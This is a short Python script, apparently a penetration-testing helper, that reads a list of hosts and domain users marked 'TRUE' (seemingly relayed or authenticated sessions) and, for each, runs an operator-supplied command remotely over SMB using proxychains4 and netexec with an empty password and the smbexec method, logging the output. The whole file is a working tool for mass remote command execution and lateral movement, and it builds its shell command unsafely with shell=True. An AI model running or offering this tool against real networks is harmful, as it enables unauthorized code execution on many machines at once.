import subprocess

def filter_true_lines(file_path):
    true_lines = []
    with open(file_path, 'r') as file:
        for line in file:
            parts = line.split()
            if len(parts) >= 4 and parts[3] == 'TRUE':
                ip = parts[1]
                domain_user = parts[2]
                true_lines.append((ip, domain_user))
    return true_lines

def run_command(ip, domain_user, command, output_file):
    if '/' in domain_user:
        domain, user = domain_user.split('/')
    else:
        domain = ''
        user = domain_user

    netexec_command = f"proxychains4 netexec smb {ip} -d {domain} -u {user} -p '' --exec-method smbexec -x '{command}'"
    
    print(f"Running command against {ip}...")

    result = subprocess.run(netexec_command, shell=True, capture_output=True, text=True)
    
    with open(output_file, 'a') as file:
        file.write(f"\n\n{'-'*80}\n")
        file.write(f"IP: {ip}\n")
        file.write(f"DOMAIN/USER: {domain_user}\n")
        file.write(f"Command Output:\n{result.stdout}\n")
        file.write(f"{'-'*80}\n")

def main():
    input_file = input("Enter the path to the input text file: ")
    output_file = input("Enter the path to the output file: ")
    command = input("Enter the command to run: ")
    
    true_lines = filter_true_lines(input_file)
    
    for ip, domain_user in true_lines:
        run_command(ip, domain_user, command, output_file)

    print("All commands executed and results are saved to", output_file)

if __name__ == "__main__":
    main()
